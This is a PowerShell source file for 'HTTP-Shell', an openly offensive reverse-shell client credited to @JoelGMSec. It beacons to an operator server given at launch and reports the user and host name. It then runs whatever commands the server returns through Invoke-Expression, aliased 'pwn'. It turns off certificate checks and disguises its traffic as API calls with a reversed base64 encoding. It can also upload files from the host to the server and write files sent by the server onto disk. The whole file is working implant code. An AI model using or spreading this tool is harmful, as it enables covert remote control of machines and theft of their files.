#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

# Variables
$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"
New-Alias -name pwn -Value iex -Force
$server = $args[1] ; $sleeps = $args[3]
$userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"

# Help
if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
Write-Host "[!] Usage: .\HTTP-Client.ps1 -c [HOST:PORT] -s [SLEEP] (optional)`n" -ForegroundColor "Red" ; exit }

# Proxy Aware & TLS Legacy Support
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,
WebRequest request, int certificateProblem) {
return true; }}
"@

$Values = $(Foreach ($Value in [System.Enum]::GetNames([System.Net.SecurityProtocolType])){
[System.Net.SecurityProtocolType]::$Value}) ; $SecureProtocols = [string]$Values
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$AllProtocols = [System.Net.SecurityProtocolType]"$($SecureProtocols.replace(' ',','))"
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
function GetEnviron {
   $usr = $env:username.toLower()+"@"+$env:computername.toLower()
   $pwd = $pwd.path ; Write-Output "$usr!$pwd" | Out-String }

function R64Encoder {
   if ($args[0] -eq "-t") { 
      $encode = $($base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1]))) 2>&1> $null }
   if ($args[0] -eq "-f") { 
      $encode = $($base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1]))) 2>&1> $null }
   $encode = $($base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")) 2>&1> $null
   $encode = $($revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64) 2>&1> $null ; return $R64Base }

function R64Decoder {
   $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
   $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
   switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
   if ($args[0] -eq "-t") {
      $decode = $($revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))) 2>&1> $null }
   if ($args[0] -eq "-f") {
      $decode = $($revb64 = [System.Convert]::FromBase64String($base64)) } return $revb64 }

function Send-HttpRequest {
   param ([string]$url, [string]$method, [string]$body)
   if ($url -notlike "http*") { $url = "http://" + $url }
   $request = [System.Net.HttpWebRequest]::Create($url)
   $request.Method = $method ; $request.UserAgent = $userAgent
   $request.ContentType = "application/x-www-form-urlencoded"
   if ($body) {
      $bytes = [System.Text.Encoding]::ASCII.GetBytes($body)
      $requestStream = $request.GetRequestStream()
      $requestStream.Write($bytes, 0, $bytes.Length)
      $requestStream.Close()}
   $response = $request.GetResponse()
   $responseStream = $response.GetResponseStream()
   $reader = New-Object System.IO.StreamReader($responseStream)
   $responseText = $reader.ReadToEnd() ; $reader.Close()
   $response.Close() ; return $responseText ; $url }

# Main
while ($true) {
   $invoke64 = "Write-Output HTTPShellNull" ; if ($sleeps) { Start-Sleep $sleeps }
   $env = GetEnviron ; $commandx = $null ; $errorlog = $null ; $getenv64 = R64Encoder -t $env
   $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2>&1> $null
   $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2>&1> $null
   $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2>&1> $null

   if ($invoke64 -like "upload*") {
      $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
      $download = $($file_content = Send-HttpRequest "$server/api/v1/Client/Download" "GET") 2>&1> $null
      $file_content = R64Decoder -f $file_content.ToString().Split(" ")[-1]
      [IO.File]::WriteAllBytes("$file_path", $file_content)}

   if ($invoke64 -like "download*") {
      $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
      $file_content = R64Encoder -f "$file_path"
      $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2>&1> $null }

   if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 ; $param = "Debug"
   if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
   if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
   $output64 = R64Encoder -t $commandx ; [string]$path = $param
   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2>&1> $null }}
